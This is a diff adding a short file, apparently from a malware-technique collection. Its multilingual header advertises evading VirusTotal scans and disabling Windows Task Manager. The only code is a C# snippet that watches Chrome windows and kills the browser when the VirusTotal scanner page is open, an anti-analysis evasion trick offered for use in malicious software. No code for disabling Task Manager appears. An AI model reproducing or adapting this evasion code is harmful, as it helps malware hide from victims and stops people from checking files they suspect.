@@ -1,0 +1,31 @@
+[FR] Anti scan VirusTotal (Méthode qui check le navigateur web avec nom de la page web)
+[ENG] Disable Windows Task Manager 7,8,10
+[SPA] Deshabilitar el administrador de tareas de windows 7,8,10
+[ITA] Disabilita Task Manager di Windows 7,8,10
+[DE] Deaktivieren des Task-Managers Windows 7,8,10
+[RU] Отключить диспетчер задач Windows 7,8,10
+
+
+
+********************************************************************************
+
+
+Process[] p = Process.GetProcessesByName("chrome");
+
+            foreach (Process item in p)
+            {
+                string name = item.MainWindowTitle;
+
+
+
+
+                if (name.Contains("Free Online Virus, Malware and URL Scanner"))
+                {
+
+
+                    Process[] proc = Process.GetProcessesByName("chrome");
+                    proc[0].Kill();
+
+
+                }
+            }
